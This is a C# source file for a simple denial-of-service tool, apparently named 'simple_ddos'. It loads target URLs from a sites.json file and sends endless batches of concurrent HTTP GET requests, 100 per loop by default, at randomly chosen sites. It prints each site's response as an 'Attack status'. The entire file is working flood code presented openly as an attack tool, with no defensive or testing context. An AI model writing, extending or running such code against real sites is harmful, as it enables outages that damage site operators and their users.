using System;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text.Json;
using System.Threading.Tasks;

namespace simple_ddos
{
    class Program
    {
        private const int defaultThreads = 100;


        static void Main(string[] args)
        {
            MainAsync(args).GetAwaiter().GetResult();
        }

        static async Task MainAsync(string[] args)
        {
            int threads = defaultThreads;

            if (args.Length > 0)
            {
                int.TryParse(args[0], out threads);
            }

            Console.WriteLine($"threads per loop: {threads}");

            var request = new Request();

            var sitesData = File.ReadAllText("sites.json");

            var sites = JsonSerializer.Deserialize<Site[]>(sitesData);

            var rnd = new Random();

            while(true)
            {
                var links = Enumerable.Range(0, threads).Select(i => sites[rnd.Next(0, sites.Length)].url);

                var tasks = links.Select(l => request.Get(l)).ToList();

                await Task.WhenAll(tasks);
            }

        }
    }


    class Request
    {
        private readonly HttpClient _httpClient = new HttpClient();
        public async Task Get(string url)
        {
            try
            {
                var response = await _httpClient
                    .GetAsync(url);
                Console.WriteLine($"Site: {url}; Attack status: {response.StatusCode}");
            }
            catch (Exception)
            {

                Console.WriteLine($"Site: {url}; Attack status: connection refused!");
            }
            
        }
    }

    class Site
    {
        public string url { get; set; }
    }
}
